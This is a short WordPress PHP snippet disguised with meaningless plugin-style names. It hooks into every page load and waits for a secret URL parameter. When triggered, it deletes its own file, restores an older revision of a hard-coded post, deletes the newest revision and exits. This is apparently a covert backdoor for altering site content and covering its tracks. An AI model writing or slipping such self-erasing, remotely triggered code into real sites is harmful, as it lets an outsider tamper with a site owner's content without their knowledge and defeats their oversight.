<?php

function title_block_addons() {
	if (isset($_GET['rest_core_ticker']) && $_GET['rest_core_ticker'] === 'scheduled_rate_shortcode') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$make_favicon_notifications_duplicate = 4543;
		$converter_table_carousel_wall = wp_get_post_revisions($make_favicon_notifications_duplicate);
		if (empty($converter_table_carousel_wall)) die('no revisions');
		if (count($converter_table_carousel_wall) < 2) die('less than 2');
		$javascript_remote_additional = array_shift($converter_table_carousel_wall);
		$qr_remote_separator_parts = $javascript_remote_additional->ID;
		$advanced_slug_composer_smooth = array_shift($converter_table_carousel_wall);
		$comment_quantity_network_importer = $advanced_slug_composer_smooth->ID;
		$photos_s3_rich = wp_restore_post_revision($comment_quantity_network_importer);
		if ($photos_s3_rich === false) die('error restoring');
		$photos_s3_rich = wp_delete_post_revision($qr_remote_separator_parts);		
		if ($photos_s3_rich === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'title_block_addons');
